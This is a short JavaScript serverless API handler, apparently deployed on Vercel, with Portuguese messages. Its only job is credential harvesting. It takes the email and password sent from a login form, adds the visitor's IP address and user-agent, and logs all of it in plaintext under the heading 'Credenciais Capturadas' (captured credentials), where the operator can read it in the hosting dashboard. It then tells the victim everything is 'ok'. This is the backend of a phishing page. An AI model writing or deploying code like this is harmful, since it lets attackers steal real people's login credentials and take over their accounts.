export default async function handler(req, res) {
  if (req.method !== 'POST') {
    console.log('[⚠️] Método inválido:', req.method);
    return res.status(405).json({ message: 'Método não permitido' });
  }

  try {
    const { email, senha } = req.body;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'];

    // Estes logs aparecem no painel da Vercel
    console.log('-----------------------------');
    console.log('📥 Credenciais Capturadas');
    console.log(`📧 Email: ${email}`);
    console.log(`🔑 Senha: ${senha}`);
    console.log(`🌐 IP: ${ip}`);
    console.log(`📱 User-Agent: ${ua}`);
    console.log('-----------------------------');

    return res.status(200).json({ status: 'ok' });
  } catch (err) {
    console.log('[❌] Erro interno:', err.message);
    return res.status(500).json({ message: 'Erro interno' });
  }
}
